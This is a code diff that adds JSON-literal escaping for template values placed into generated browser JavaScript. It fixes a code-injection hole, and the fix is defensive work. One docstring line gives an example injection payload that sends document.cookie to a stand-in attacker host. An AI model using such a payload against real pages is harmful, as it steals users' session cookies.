@@ -25,6 +25,7 @@ impossible to debug, so the validator refuses it outright.
 
 from __future__ import annotations
 
+import json
 import re
 import uuid
 from datetime import datetime, timezone
@@ -115,6 +116,58 @@ def render_template(value: Any, *, inputs: dict[str, Any], secrets: dict[str, An
     if isinstance(value, list):
         return [render_template(v, inputs=inputs, secrets=secrets, env=env) for v in value]
     return value
+
+
+#: A template with its surrounding quote, as it appears inside generated
+#: JavaScript: ``page.fill('#name', '{{input.full_name}}')``.
+_QUOTED_TEMPLATE_RE = re.compile(
+    # The trailing backreference matters: it requires the *same* quote to
+    # close, so the whole literal is consumed and replaced. Without it the
+    # JSON value lands between the original quotes -- producing '"Nitin"',
+    # and for a value containing a quote, an escape out of the string.
+    r"""(['"`])\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}\1"""
+)
+
+
+def render_code(
+    code: str,
+    *,
+    inputs: dict[str, Any],
+    secrets: dict[str, Any],
+    env: dict[str, Any] | None = None,
+) -> str:
+    """Substitute templates into JavaScript source, safely.
+
+    This cannot use :func:`render_template`. That one splices the raw value in
+    where the template was, which is correct for a form field and a code
+    injection vulnerability here: a value of
+
+        '); fetch('https://evil.example/'+document.cookie); ('
+
+    would close the string literal it sits in and run whatever follows. The
+    values come from a spreadsheet that may have been assembled by someone with
+    no idea their data reaches a browser, so this is a real path rather than a
+    theoretical one.
+
+    Each value is therefore emitted as a JSON literal -- ``json.dumps`` escapes
+    quotes, backslashes and newlines, and ``ensure_ascii`` turns U+2028/U+2029
+    into escapes, which JavaScript would otherwise read as line terminators. A
+    quoted template consumes its quotes so the result is one literal rather
+    than a literal nested inside a string.
+    """
+    sources = {"input": inputs, "secret": secrets, "env": env or {}}
+
+    def literal(kind: str, name: str) -> str:
+        source = sources[kind]
+        if name not in source:
+            raise MissingValue(f"{kind}.{name}")
+        value = source[name]
+        return json.dumps("" if value is None else str(value), ensure_ascii=True)
+
+    # Quoted first, so the quotes are consumed rather than left wrapping the
+    # JSON literal this produces.
+    code = _QUOTED_TEMPLATE_RE.sub(lambda m: literal(m.group(2), m.group(3)), code)
+    return TEMPLATE_RE.sub(lambda m: literal(m.group(1), m.group(2)), code)
 
 
 # ---------------------------------------------------------------------------
@@ -385,6 +438,13 @@ class Step(BaseModel):
                 "fields": [f.value for f in self.fields],
                 "assert": self.assertion.value if self.assertion else None,
                 "wait": self.wait_for.value if self.wait_for else None,
+                # Script code counts. It used to be excluded because nothing
+                # substituted into it, so an input referenced there could never
+                # be filled -- which meant a recording that drove a form via
+                # JavaScript produced a use case with no inputs at all, asking
+                # for nothing and typing "{{input.full_name}}" into the page.
+                # render_code() makes the reference real, so it is now counted.
+                "code": self.code,
             }
         )
 
